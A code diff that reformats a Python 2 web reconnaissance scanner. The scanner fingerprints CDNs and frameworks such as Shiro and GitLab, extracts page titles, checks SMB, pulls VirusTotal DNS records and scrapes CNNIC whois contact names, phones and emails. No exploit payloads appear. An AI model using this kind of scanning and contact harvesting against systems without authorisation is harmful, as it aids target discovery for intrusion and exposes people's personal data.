+                    # check cdn
                     if args.m == "cdnscan":
                         cdntype = None
 
                         try:
-                            if r.info().getheader("processtime") or r.info().getheader("X-NWS-LOG-UUID"):
+                            if r.info().getheader("processtime") or r.info().getheader(
+                                "X-NWS-LOG-UUID"
+                            ):
                                 cdntype = "Huawei CDN"
-                                
+
                             if r.info().getheader("Ali-Swift-Global-Savetime"):
                                 cdntype = "Ali CDN"
 
@@ -6514,46 +6848,49 @@ class ThreadUrl(threading.Thread):
                                     cdntype = "Huawei CDN"
                                 if "cloudfront" in r.info().getheader("via"):
                                     cdntype = "Cloudfront CDN"
-                            
+
                             if r.info().getheader("Server"):
                                 if "CloudWAF" in r.info().getheader("Server"):
                                     cdntype = "Huawei CloudWAF"
-                            
+
                         except Exception as e:
                             pass
 
                         chunk = (cdntype, (domain, req.origin_req_host, self.outfile))
                         self.out_queue.put(chunk)
-                        raise ValueError('Terminal cdn scan')
+                        raise ValueError("Terminal cdn scan")
                     # check cdn over
 
-                    
-
                     # finger arear
-                    if  "=deleteMe" in str(r.info().getheader("Set-Cookie")):
+                    if "=deleteMe" in str(r.info().getheader("Set-Cookie")):
                         domain += " | " + bingo("Shiro!!")
-                    if  "ASPSESSIONID" in str(r.info().getheader("Set-Cookie")):
+                    if "ASPSESSIONID" in str(r.info().getheader("Set-Cookie")):
                         domain += " | " + info("[ ASP.NET ]")
-                    if  "JSESSIONID" in str(r.info().getheader("Set-Cookie")):
+                    if "JSESSIONID" in str(r.info().getheader("Set-Cookie")):
                         domain += " | " + info("[ JSP ]")
-                    if  "PHPSESSID" in str(r.info().getheader("Set-Cookie")):
+                    if "PHPSESSID" in str(r.info().getheader("Set-Cookie")):
                         domain += " | " + info("[ PHP ]")
-                    if  "laravel_session" in str(r.info().getheader("Set-Cookie")):
+                    if "laravel_session" in str(r.info().getheader("Set-Cookie")):
                         domain += " | " + info("[ laravel ]")
-                    if  "jeesite.session.id" in str(r.info().getheader("Set-Cookie")):
+                    if "jeesite.session.id" in str(r.info().getheader("Set-Cookie")):
                         domain += " | " + bingo("[ jeesite!! ]")
-                    if  "trsidsssosessionid" in str(r.info().getheader("Set-Cookie")):
+                    if "trsidsssosessionid" in str(r.info().getheader("Set-Cookie")):
                         domain += " | " + bingo("[ 拓尔思sso!! ]")
-                    if  "com.trs.idm.coSessionId" in str(r.info().getheader("Set-Cookie")):
+                    if "com.trs.idm.coSessionId" in str(
+                        r.info().getheader("Set-Cookie")
+                    ):
                         domain += " | " + bingo("[ 拓尔思WCMv7/6!! ]")
-                    if  "_gitlab_session" in str(r.info().getheader("Set-Cookie")):
+                    if "_gitlab_session" in str(r.info().getheader("Set-Cookie")):
                         domain += " | " + bingo("[ gitlab!! ]")
                     if r.info().getheader("X-Powered-By"):
-                        domain += " | " + info("[ " + r.info().getheader("X-Powered-By") + " ]")
+                        domain += " | " + info(
+                            "[ " + r.info().getheader("X-Powered-By") + " ]"
+                        )
 
-
-                    regeipForDomain = re.compile(r"((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d))", re.IGNORECASE)
-
+                    regeipForDomain = re.compile(
+                        r"((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d))",
+                        re.IGNORECASE,
+                    )
 
                     replaceip = re.findall(regeipForDomain, domain)
                     replaceip_final = ""
@@ -6563,8 +6900,9 @@ class ThreadUrl(threading.Thread):
 
                     if not containenglish(replaceip_final):
                         if infoscan.checkCloudSever(replaceip_final) != 0:
-                            domain += " | " + info("[ " + infoscan.checkCloudSever(replaceip_final) + " ]")
-
+                            domain += " | " + info(
+                                "[ " + infoscan.checkCloudSever(replaceip_final) + " ]"
+                            )
 
                     # Temprarily change the method of decode for Python3 !!
                     try:
@@ -6583,44 +6921,53 @@ class ThreadUrl(threading.Thread):
 
                     # Finger identification
                     web_finger = self.trie.query(resp)
-                    if  web_finger is not None:
+                    if web_finger is not None:
                         domain += " | " + bingo(web_finger)
 
                     web_cfinger = self.trie.Chinses_query(resp)
                     if web_cfinger != None:
                         domain += " | " + bingo(web_cfinger)
-                        
+
                     try:
                         if "charset" not in str(r.info().getheader("Content-Type")):
-                            p1 = re.compile('charset=[\"\']?(.*?)[\"\']?[\"\>\'\s]', re.IGNORECASE)
+                            p1 = re.compile(
+                                "charset=[\"']?(.*?)[\"']?[\"\>'\s]", re.IGNORECASE
+                            )
                             target1 = re.findall(p1, resp)
-                            if len(target1) == 0 :
+                            if len(target1) == 0:
                                 target1.append("utf-8")
                             if target1[0].lower() != "utf-8" and "utf-8" in target1[0]:
                                 target1[0] = "utf-8"
 
                         elif "charset" in str(r.info().getheader("Content-Type")):
 
-                                p1 = re.compile("charset=(.*)", re.IGNORECASE)
-                                target1 = re.findall(p1, CT)
+                            p1 = re.compile("charset=(.*)", re.IGNORECASE)
+                            target1 = re.findall(p1, CT)
                     except Exception as e:
-                        print(bingo(domain) + "-------------Get charset error! But don't  worry !")
-
+                        print(
+                            bingo(domain)
+                            + "-------------Get charset error! But don't  worry !"
+                        )
 
                     p2 = re.compile("<title[\s\S]*?>([\s\S]*?)</title>", re.IGNORECASE)
                     p3 = 'Description.*content="(.*)"'
-                    p4 = re.compile('<meta name="keywords" content="(.*?)".*?>', re.IGNORECASE)
+                    p4 = re.compile(
+                        '<meta name="keywords" content="(.*?)".*?>', re.IGNORECASE
+                    )
                     # this is to not redirct because js
                     p5 = re.compile(
-                        'window.location=[jqwekwqklejqkwejjwqlkeqjlkqwjsdljasldjalksd|kjasdjasldjlaksdjlasjdlqwiueouqwoejkaskgvhdushijdskfhbj|<meta[\s\S]*?HTTP-EQUIV=["\']REFRESH["\'][\s\S]*?url=(.*)["\'][\s\S]*?>',
-                        re.IGNORECASE)
+                        "window.location=[jqwekwqklejqkwejjwqlkeqjlkqwjsdljasldjalksd|kjasdjasldjlaksdjlasjdlqwiueouqwoejkaskgvhdushijdskfhbj|<meta[\s\S]*?HTTP-EQUIV=[\"']REFRESH[\"'][\s\S]*?url=(.*)[\"'][\s\S]*?>",
+                        re.IGNORECASE,
+                    )
                     p6 = re.compile("document.title(.*?);", re.IGNORECASE)
                     p7 = re.compile("Copyright.*\.? ", re.IGNORECASE)
                     p8 = re.compile("<h1.*?>(.*?)</h1>", re.IGNORECASE)
                     self.p9 = len(resp)
                     # this is to not redirct because js
-                    p11 = re.compile("qwejiqweuqwoeuioqwueiousdaoyqwehuy7ducihgf7yudiwhscuyihcuyhbdsyh", re.IGNORECASE)
-
+                    p11 = re.compile(
+                        "qwejiqweuqwoeuioqwueiousdaoyqwehuy7ducihgf7yudiwhscuyihcuyhbdsyh",
+                        re.IGNORECASE,
+                    )
 
                     target2 = re.findall(p2, resp)
                     target3 = re.findall(p3, resp)
@@ -6640,42 +6987,82 @@ class ThreadUrl(threading.Thread):
                     """
 
                     if len(target5) != 0 and target5[0] != "":
-                        target5 = [remove_air.replace('\'', '').replace('"', "") for remove_air in target5[0] if remove_air != ""]
+                        target5 = [
+                            remove_air.replace("'", "").replace('"', "")
+                            for remove_air in target5[0]
+                            if remove_air != ""
+                        ]
                     if len(target5) != 0 and target5[0] != "":
                         check_index = resp.find(target5[0])
                         if check_index < 51:
-                            if resp[: check_index].find("<!--")  >=0 or resp[check_index-25: check_index].find("//") >= 0:
+                            if (
+                                resp[:check_index].find("<!--") >= 0
+                                or resp[check_index - 25 : check_index].find("//") >= 0
+                            ):
                                 target5 = []
                         else:
-                            if resp[check_index-50: check_index].find("<!--") >=0 or resp[check_index-25: check_index].find("//") >= 0:
+                            if (
+                                resp[check_index - 50 : check_index].find("<!--") >= 0
+                                or resp[check_index - 25 : check_index].find("//") >= 0
+                            ):
                                 target5 = []
 
                     if len(target11) != 0 and target11[0] != "":
                         check_index = resp.find(target11[0])
-                        if check_index <51:
-                            if resp[: check_index].find("<!--") >= 0 or resp[check_index-25: check_index].find("//")>=0:
+                        if check_index < 51:
+                            if (
+                                resp[:check_index].find("<!--") >= 0
+                                or resp[check_index - 25 : check_index].find("//") >= 0
+                            ):
                                 target11 = []
 
-
                         else:
-                            if resp[check_index-50: check_index].find("<!--") >=0 or resp[check_index-25:check_index].find("//") >= 0:
+                            if (
+                                resp[check_index - 50 : check_index].find("<!--") >= 0
+                                or resp[check_index - 25 : check_index].find("//") >= 0
+                            ):
                                 target11 = []
                     if len(target2) != 0 and target2[0] != "":
                         # get title from <title>
                         if len(target1) == 0:
-                            resp_title = "<title>" + target2[0].encode("utf-8").replace("\"", "") + "</title>"
+                            resp_title = (
+                                "<title>"
+                                + target2[0].encode("utf-8").replace('"', "")
+                                + "</title>"
+                            )
                         else:
                             try:
                                 if len(target1[0]) != 0:
-                                    resp_title = "<title>" + target2[0].decode(target1[0]).encode("utf-8").replace("\"", "")+ "</title>"
+                                    resp_title = (
+                                        "<title>"
+                                        + target2[0]
+                                        .decode(target1[0])
+                                        .encode("utf-8")
+                                        .replace('"', "")
+                                        + "</title>"
+                                    )
                                 else:
-                                    resp_title = "<title>" + target2[0].replace("\"", "") + "</title>"
+                                    resp_title = (
+                                        "<title>"
+                                        + target2[0].replace('"', "")
+                                        + "</title>"
+                                    )
                             except AttributeError as e:
-                                resp_title = "<title>" + target2[0].replace("\"", "")+ "</title>"
+                                resp_title = (
+                                    "<title>" + target2[0].replace('"', "") + "</title>"
+                                )
                             except LookupError as e:
-                                resp_title = "<title>" + target2[0].encode("utf-8").replace("\"", "") + "</title>"
+                                resp_title = (
+                                    "<title>"
+                                    + target2[0].encode("utf-8").replace('"', "")
+                                    + "</title>"
+                                )
                             except IndexError as e:
-                                resp_title = "<title>" + target2[0].encode("utf-8").replace("\"", "") + "</title>"
+                                resp_title = (
+                                    "<title>"
+                                    + target2[0].encode("utf-8").replace('"', "")
+                                    + "</title>"
+                                )
                             except Exception as e:
                                 resp_title = "<title>None</title>"
 
@@ -6691,18 +7078,33 @@ class ThreadUrl(threading.Thread):
                             else:
                                 # get title from windows.location
                                 if len(target5) != 0 and target5[0] != "":
-                                    if target5[0] == domain :
+                                    if target5[0] == domain:
                                         self.queue.task_done()
                                         continue
-                                    elif "http" in target5[0][: 4].lower():
+                                    elif "http" in target5[0][:4].lower():
                                         queue.put(target5[0])
                                     elif target5[0].startswith("//"):
                                         queue.put(domain.split("//")[0] + target5[0])
                                     elif target5[0].startswith("/"):
-                                        queue.put( domain.split("//")[0] + "//" + domain.split("//")[1].split("/")[0] + target5[0])
+                                        queue.put(
+                                            domain.split("//")[0]
+                                            + "//"
+                                            + domain.split("//")[1].split("/")[0]
+                                            + target5[0]
+                                        )
                                     else:
                                         if len(domain.split("//")[1].split("/")) > 1:
-                                            queue.put(domain.split("//")[0] + "//" + "/".join(domain.split("//")[1].split("/")[: -1]) + "/" + target5[0])
+                                            queue.put(
+                                                domain.split("//")[0]
+                                                + "//"
+                                                + "/".join(
+                                                    domain.split("//")[1].split("/")[
+                                                        :-1
+                                                    ]
+                                                )
+                                                + "/"
+                                                + target5[0]
+                                            )
 
                                         else:
                                             queue.put(domain + "/" + target5[0])
@@ -6711,80 +7113,176 @@ class ThreadUrl(threading.Thread):
                                     continue
                                 else:
                                     if len(target6) != 0 and target6[0] != "":
-                                        resp_title = "<title>" + target6[0].replace("=", "") + "</title>"
+                                        resp_title = (
+                                            "<title>"
+                                            + target6[0].replace("=", "")
+                                            + "</title>"
+                                        )
                                     else:
                                         if len(target7) != 0 and target7[0] != "":
-                                            resp_title = "<title>" + target7[0] + "</title>"
+                                            resp_title = (
+                                                "<title>" + target7[0] + "</title>"
+                                            )
                                         else:
                                             if len(target8) != 0 and target8[0] != "":
-                                                resp_title = "<title>" + target8[0] + "</title>"
+                                                resp_title = (
+                                                    "<title>" + target8[0] + "</title>"
+                                                )
                                             else:
-                                                if len(target11) != 0 and target11[0] != "":
+                                                if (
+                                                    len(target11) != 0
+                                                    and target11[0] != ""
+                                                ):
 
-                                                    if target11[0] == domain :
+                                                    if target11[0] == domain:
                                                         self.queue.task_done()
                                                         continue
-                                                    elif target11[0][:4].lower().startswith("http"):
+                                                    elif (
+                                                        target11[0][:4]
+                                                        .lower()
+                                                        .startswith("http")
+                                                    ):
                                                         queue.put(target11[0])
                                                     elif target11[0].startswith("//"):
 
-                                                        queue.put(domain.split("//")[0] + target11[0])
+                                                        queue.put(
+                                                            domain.split("//")[0]
+                                                            + target11[0]
+                                                        )
                                                     elif target11[0].startswith("/"):
                                                         queue.put(
-                                                            domain.split("//")[0] + "//" + domain.split("//")[1].split("/")[
-                                                                0] + target11[0])
+                                                            domain.split("//")[0]
+                                                            + "//"
+                                                            + domain.split("//")[
+                                                                1
+                                                            ].split("/")[0]
+                                                            + target11[0]
+                                                        )
                                                     else:
-                                                        if len(domain.split("//")[1].split("/")) > 1:
-                                                            queue.put(domain.split("//")[0] + "//" + "/".join(
-                                                                domain.split("//")[1].split("/")[:-1]) + "/" + target11[0])
+                                                        if (
+                                                            len(
+                                                                domain.split("//")[
+                                                                    1
+                                                                ].split("/")
+                                                            )
+                                                            > 1
+                                                        ):
+                                                            queue.put(
+                                                                domain.split("//")[0]
+                                                                + "//"
+                                                                + "/".join(
+                                                                    domain.split("//")[
+                                                                        1
+                                                                    ].split("/")[:-1]
+                                                                )
+                                                                + "/"
+                                                                + target11[0]
+                                                            )
 
                                                         else:
-                                                            queue.put(domain + "/" + target11[0])
+                                                            queue.put(
+                                                                domain
+                                                                + "/"
+                                                                + target11[0]
+                                                            )
 
                                                     self.queue.task_done()
                                                     continue
                                                 else:
-                                                    if self.p9 == 0 or self.p9 <=3:
-                                                        resp_title = "<title>None</title>"
+                                                    if self.p9 == 0 or self.p9 <= 3:
+                                                        resp_title = (
+                                                            "<title>None</title>"
+                                                        )
                                                     elif self.p9 <= 100:
-                                                        resp_title = "<title>" + resp  + "</title>"
+                                                        resp_title = (
+                                                            "<title>"
+                                                            + resp
+                                                            + "</title>"
+                                                        )
                                                     else:
-                                                        resp_title = "<title>" + resp[0:10] + "</title>"
+                                                        resp_title = (
+                                                            "<title>"
+                                                            + resp[0:10]
+                                                            + "</title>"
+                                                        )
 
-                    resp_title = resp_title.replace("\n","").replace("\t","").replace("\r","").strip()
+                    resp_title = (
+                        resp_title.replace("\n", "")
+                        .replace("\t", "")
+                        .replace("\r", "")
+                        .strip()
+                    )
                     resp_title = title_unescap(resp_title)
 
                     if checkbackground(resp, resp_title, domain):
                         domain += " | " + info("[后台]")
-                    
+
                     if redirct_count:
-                        res = (resp_title, first_domain + "  ---->  " + domain, r.getcode())
+                        res = (
+                            resp_title,
+                            first_domain + "  ---->  " + domain,
+                            r.getcode(),
+                        )
                     else:
                         if args.m == "hostscan":
-                            res = (resp_title, domain.replace(replaceip_final,first_domain), r.getcode())
+                            res = (
+                                resp_title,
+                                domain.replace(replaceip_final, first_domain),
+                                r.getcode(),
+                            )
                         else:
                             res = (resp_title, domain, r.getcode())
                     try:
                         # for parameter uf to ignore control status code
-                        if res[2] == 404 and not self.error_404: pass
-                        elif res[2] == 400 and not self.error_400: pass
-                        elif res[2] == 403 and not self.error_403: pass
-                        elif res[2] == 500 and not self.error_500: pass
-                        elif res[2] == 401 and not self.error_401: pass
-                        elif res[2] == 502 and not self.error_502: pass
-                        elif res[2] == 503 and not self.error_503: pass
-                        elif res[2] == 501 and not self.error_501: pass
+                        if res[2] == 404 and not self.error_404:
+                            pass
+                        elif res[2] == 400 and not self.error_400:
+                            pass
+                        elif res[2] == 403 and not self.error_403:
+                            pass
+                        elif res[2] == 500 and not self.error_500:
+                            pass
+                        elif res[2] == 401 and not self.error_401:
+                            pass
+                        elif res[2] == 502 and not self.error_502:
+                            pass
+                        elif res[2] == 503 and not self.error_503:
+                            pass
+                        elif res[2] == 501 and not self.error_501:
+                            pass
                         else:
                             if args.hiddensize:
-                                hiddensize = [str(i) for i in parse_range_int(args.hiddensize)]
-                                #1-10 return int
+                                hiddensize = [
+                                    str(i) for i in parse_range_int(args.hiddensize)
+                                ]
+                                # 1-10 return int
                                 if str(self.p9) in hiddensize:
                                     self.queue.task_done()
                                     continue
-                            chunk = (res[0], [res[1], "Server:" + Serverinfo, res[2], self.outfile, self.lock, self.p9])
+                            chunk = (
+                                res[0],
+                                [
+                                    res[1],
+                                    "Server:" + Serverinfo,
+                                    res[2],
+                                    self.outfile,
+                                    self.lock,
+                                    self.p9,
+                                ],
+                            )
                             self.out_queue.put(chunk)
                     except KeyError as e:
-                        chunk = (res[0], [res[1], "Server:None", res[2], self.outfile, self.lock, self.p9])
+                        chunk = (
+                            res[0],
+                            [
+                                res[1],
+                                "Server:None",
+                                res[2],
+                                self.outfile,
+                                self.lock,
+                                self.p9,
+                            ],
+                        )
                         self.out_queue.put(chunk)
 
                     # Process for Windows
@@ -6793,11 +7291,16 @@ class ThreadUrl(threading.Thread):
                         if progress_num - temp != 0:
                             temp = progress_num
                         else:
-                            if (progress_num <= scaned or self.queue.empty()) and platform.system() == "Windows":
+                            if (
+                                progress_num <= scaned or self.queue.empty()
+                            ) and platform.system() == "Windows":
                                 self.lock.release()
-                                for i in range(int(args.timeout+5)):
+                                for i in range(int(args.timeout + 5)):
                                     erase()
-                                    lines = "Wait %d s to exit press Control+C to exit \r" % (args.timeout+5-i)
+                                    lines = (
+                                        "Wait %d s to exit press Control+C to exit \r"
+                                        % (args.timeout + 5 - i)
+                                    )
                                     sys.stdout.write(info(lines))
                                     sys.stdout.flush()
                                     time.sleep(1)
@@ -6813,11 +7316,31 @@ class ThreadUrl(threading.Thread):
                     # near than dirsearch
 
                     if "HTTP Error 403" in e.__str__():
-                        chunk = ("<title>403</title>", (domain, "Server:" + "None", 403, self.outfile, self.lock,self.p9))
+                        chunk = (
+                            "<title>403</title>",
+                            (
+                                domain,
+                                "Server:" + "None",
+                                403,
+                                self.outfile,
+                                self.lock,
+                                self.p9,
+                            ),
+                        )
                         if self.errors_403:
                             self.out_queue.put(chunk)
                     if "HTTP Error 404" in e.__str__():
-                        chunk = ("<title>404</title>", (domain, "Server:" + "None", 404, self.outfile, self.lock,self.p9))
+                        chunk = (
+                            "<title>404</title>",
+                            (
+                                domain,
+                                "Server:" + "None",
+                                404,
+                                self.outfile,
+                                self.lock,
+                                self.p9,
+                            ),
+                        )
                         if self.error_404:
                             self.out_queue.put(chunk)
                     if "HTTP Error 400" in e.__str__():
@@ -6828,16 +7351,29 @@ class ThreadUrl(threading.Thread):
                     pass
 
                 except httplib.BadStatusLine as e:
-                    chunk = ("<title>证书错误</title>", (domain, "Server:" + "None", 200, self.outfile, self.lock, self.p9))
+                    chunk = (
+                        "<title>证书错误</title>",
+                        (
+                            domain,
+                            "Server:" + "None",
+                            200,
+                            self.outfile,
+                            self.lock,
+                            self.p9,
+                        ),
+                    )
                     self.out_queue.put(chunk)
 
                 except httplib.HTTPException as e:
                     pass
                 except Exception as e:
-                    if "timed out" in e.__str__() or "Connection refused" in e.__str__():
+                    if (
+                        "timed out" in e.__str__()
+                        or "Connection refused" in e.__str__()
+                    ):
                         pass
                     elif "certificate" in e.__str__():
-                        print(e.__str__(),domain)
+                        print(e.__str__(), domain)
                     else:
                         pass
 
@@ -6848,16 +7384,21 @@ class ThreadUrl(threading.Thread):
                     count_flag = False
                     progress()
                     self.lock.acquire(1)
-                    
+
                     if progress_num != 0:
                         if progress_num - temp != 0:
                             temp = progress_num
                         else:
-                            if (progress_num <= scaned or self.queue.empty()) and platform.system() == "Windows":
+                            if (
+                                progress_num <= scaned or self.queue.empty()
+                            ) and platform.system() == "Windows":
                                 self.lock.release()
-                                for i in range(int(args.timeout+5)):
+                                for i in range(int(args.timeout + 5)):
                                     erase()
-                                    lines = "Wait %d s to exit press Control+C to exit \r" % (args.timeout+5-i)
+                                    lines = (
+                                        "Wait %d s to exit press Control+C to exit \r"
+                                        % (args.timeout + 5 - i)
+                                    )
                                     sys.stdout.write(info(lines))
                                     sys.stdout.flush()
                                     time.sleep(1)
@@ -6875,7 +7416,7 @@ class ThreadUrl(threading.Thread):
                 scaned += 1
                 if progress_num != 0:
                     if progress_num - temp != 0:
-                            temp = progress_num
+                        temp = progress_num
                     else:
                         if progress_num <= scaned and platform.system() == "Windows":
                             self.lock.release()
@@ -6929,10 +7470,10 @@ class ThreadUrl(threading.Thread):
                 self.lock.acquire(1)
                 progress.current += 1
                 scaned += 1
-                
+
                 if progress_num != 0:
                     if progress_num - temp != 0:
-                            temp = progress_num
+                        temp = progress_num
                     else:
                         if progress_num <= scaned and platform.system() == "Windows":
                             self.lock.release()
@@ -6947,7 +7488,7 @@ class ThreadUrl(threading.Thread):
                 ip = domain[0]
                 ports = domain[1]
                 try:
-                    smb_detect(ip,self.lock, ports)
+                    smb_detect(ip, self.lock, ports)
                     self.lock.acquire(1)
                     progress.current += 1
                     scaned += 1
@@ -6955,7 +7496,10 @@ class ThreadUrl(threading.Thread):
                         if progress_num - temp != 0:
                             temp = progress_num
                         else:
-                            if progress_num <= scaned and platform.system() == "Windows":
+                            if (
+                                progress_num <= scaned
+                                and platform.system() == "Windows"
+                            ):
                                 self.lock.release()
                                 time.sleep(0.1)
                                 progress.dones()
@@ -6973,7 +7517,7 @@ class ThreadUrl(threading.Thread):
                 scaned += 1
                 if progress_num != 0:
                     if progress_num - temp != 0:
-                            temp = progress_num
+                        temp = progress_num
                     else:
                         if progress_num <= scaned and platform.system() == "Windows":
                             self.lock.release()
@@ -6984,10 +7528,8 @@ class ThreadUrl(threading.Thread):
 
                 progress()
 
-            
-            #signals to queue job is done
+            # signals to queue job is done
             self.queue.task_done()
-
 
 
 # stronger info SCAN
@@ -6998,12 +7540,16 @@ class infoscan:
     This is awesome info scan, all of results will be saved by dict
     """
 
-
     def __init__(self, domain):
-        global progress # enable progress bar
+        global progress  # enable progress bar
         self.vtapi_key = Account().Vtapikey()
         self.shodan_key = Account().Shodankey()
-        self.domain = domain.replace("http://","").replace("https://","").replace("www.","").strip("/")
+        self.domain = (
+            domain.replace("http://", "")
+            .replace("https://", "")
+            .replace("www.", "")
+            .strip("/")
+        )
         self.result = {}
 
     @staticmethod
@@ -7016,15 +7562,18 @@ class infoscan:
         """
         failMesg = """
         <div class="col-lg-%d"><div class="card m-b-30"><div class="card-body"><h4>%s</h4><div class="alert alert-danger" role="alert"><strong>Oops!</strong>%s are not value</div><p class="sub-title">%s</p></div></div></div>
-        """%(lens, mname, mname, api)
+        """ % (
+            lens,
+            mname,
+            mname,
+            api,
+        )
 
         return failMesg
 
     @staticmethod
     def shtmlencode(lens, method, api):
         pass
-
-
 
     # dns records
 
@@ -7045,19 +7594,26 @@ class infoscan:
             try:
                 progress()
                 progress.current += 1
-                urlapi = "https://www.virustotal.com/vtapi/v2/domain/report?apikey=%s&domain=%s" %(self.vtapi_key, self.domain)
+                urlapi = (
+                    "https://www.virustotal.com/vtapi/v2/domain/report?apikey=%s&domain=%s"
+                    % (self.vtapi_key, self.domain)
+                )
                 ho = urllib2.OpenerDirector()
                 ho.add_handler(urllib2.HTTPSHandler())
                 req = urllib2.Request(urlapi)
                 if proxy_type and proxy_host:
                     if proxy_type == "http":
-                        ho.add_handler(urllib2.ProxyHandler({"https":proxy_host}))
+                        ho.add_handler(urllib2.ProxyHandler({"https": proxy_host}))
                     elif proxy_type == "socks5":
                         proxy_h, proxy_port = proxy_host.split(":")
-                        ho.add_handler(SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port) ))
+                        ho.add_handler(
+                            SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port))
+                        )
                     elif proxy_type == "socks4":
                         proxy_h, proxy_port = proxy_host.split(":")
-                        ho.add_handler(SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port) ))
+                        ho.add_handler(
+                            SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port))
+                        )
 
                 r = ho.open(req, timeout=5)
                 r = json.loads(r.read())
@@ -7068,7 +7624,7 @@ class infoscan:
                     if "type" in recordses:
                         name = "records" + str(iterm)
                         result["type"] = recordses["type"]
-                        result["value"]  = recordses["value"]
+                        result["value"] = recordses["value"]
                         result["ttl"] = recordses["ttl"]
                         if "priority" in recordses.keys():
                             result["priority"] = recordses["priority"]
@@ -7076,7 +7632,7 @@ class infoscan:
                         iterm += 1
                     else:
                         dns_records["other"] = recordses
-                dns_records["iterm"] = iterm - 1 
+                dns_records["iterm"] = iterm - 1
                 self.result["vtdns_records"] = dns_records
                 return dns_records
             except:
@@ -7086,7 +7642,7 @@ class infoscan:
         self.result["vtdns_records"] = None
         return None
 
-    # history of domain resolution 
+    # history of domain resolution
     def vt_resolutions(self):
         """
         dict key info:
@@ -7100,20 +7656,27 @@ class infoscan:
         for i in range(3):
             try:
                 progress()
-                progress.current += 1 
-                urlapi = "https://www.virustotal.com/vtapi/v2/domain/report?apikey=%s&domain=%s" %(self.vtapi_key,self.domain)
+                progress.current += 1
+                urlapi = (
+                    "https://www.virustotal.com/vtapi/v2/domain/report?apikey=%s&domain=%s"
+                    % (self.vtapi_key, self.domain)
+                )
                 ho = urllib2.OpenerDirector()
                 ho.add_handler(urllib2.HTTPSHandler())
                 req = urllib2.Request(urlapi)
                 if proxy_type and proxy_host:
                     if proxy_type == "http":
-                        ho.add_handler(urllib2.ProxyHandler({"https":proxy_host}))
+                        ho.add_handler(urllib2.ProxyHandler({"https": proxy_host}))
                     elif proxy_type == "socks5":
                         proxy_h, proxy_port = proxy_host.split(":")
-                        ho.add_handler(SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port) ))
+                        ho.add_handler(
+                            SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port))
+                        )
                     elif proxy_type == "socks4":
                         proxy_h, proxy_port = proxy_host.split(":")
-                        ho.add_handler(SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port) ))
+                        ho.add_handler(
+                            SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port))
+                        )
                 r = ho.open(req, timeout=3)
                 r = json.loads(r.read())
                 resl = {}
@@ -7129,7 +7692,7 @@ class infoscan:
                 self.result["vt_resolutions"] = resl
                 return resl
             except:
-                progress.total +=1
+                progress.total += 1
                 progress()
                 time.sleep(1)
         self.result["vt_resolutions"] = None
@@ -7153,44 +7716,68 @@ class infoscan:
         for i in range(3):
             try:
                 progress()
-                progress.current += 1   
+                progress.current += 1
                 cnnic_result = {}
                 try:
-                    domain = self.domain.replace("http://","").replace("https://","")
+                    domain = self.domain.replace("http://", "").replace("https://", "")
                     target_ip = socket.gethostbyname(domain)
                 except Exception as e:
                     break
-                info_url = "http://ipwhois.cnnic.net.cn/bns/query/Query/ipwhoisQuery.do?txtquery={}&queryOption=ipv4".format(target_ip)
+                info_url = "http://ipwhois.cnnic.net.cn/bns/query/Query/ipwhoisQuery.do?txtquery={}&queryOption=ipv4".format(
+                    target_ip
+                )
                 infoms = urllib.urlopen(info_url).read()
-                ipv4=re.findall(r'IPv4地址段:</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',infoms)[0]
-                desc_company="\n\t".join(re.findall(r'单位描述:</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',infoms))
-                targetinfo3=re.findall(r'(?:姓名|角色):</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',infoms)
-                address="\n\t".join(re.findall(r'通讯地址:</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',infoms))
-                targetinfo5=re.findall(r'办公电话:</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',infoms)
-                targetinfo6=re.findall(r'邮件地址:</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',infoms)
-                cnnic_result['ipv4'] = ipv4
-                cnnic_result['desc_company'] = desc_company
-                cnnic_result['address'] = address
+                ipv4 = re.findall(
+                    r'IPv4地址段:</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',
+                    infoms,
+                )[0]
+                desc_company = "\n\t".join(
+                    re.findall(
+                        r'单位描述:</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',
+                        infoms,
+                    )
+                )
+                targetinfo3 = re.findall(
+                    r'(?:姓名|角色):</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',
+                    infoms,
+                )
+                address = "\n\t".join(
+                    re.findall(
+                        r'通讯地址:</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',
+                        infoms,
+                    )
+                )
+                targetinfo5 = re.findall(
+                    r'办公电话:</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',
+                    infoms,
+                )
+                targetinfo6 = re.findall(
+                    r'邮件地址:</font></td>\r\n                <td align="left" class="t_blue"><font size="2">(.*?)\&nbsp;</font>',
+                    infoms,
+                )
+                cnnic_result["ipv4"] = ipv4
+                cnnic_result["desc_company"] = desc_company
+                cnnic_result["address"] = address
 
-                # dict of person information 
+                # dict of person information
                 iterm = 1
-                
-                for name,phone,email in zip(targetinfo3,targetinfo5,targetinfo6):
+
+                for name, phone, email in zip(targetinfo3, targetinfo5, targetinfo6):
                     names = "persons" + str(iterm)
                     personinfo = {}
-                    personinfo['name'] = name
-                    personinfo['phone'] = phone
-                    personinfo['email'] = email
+                    personinfo["name"] = name
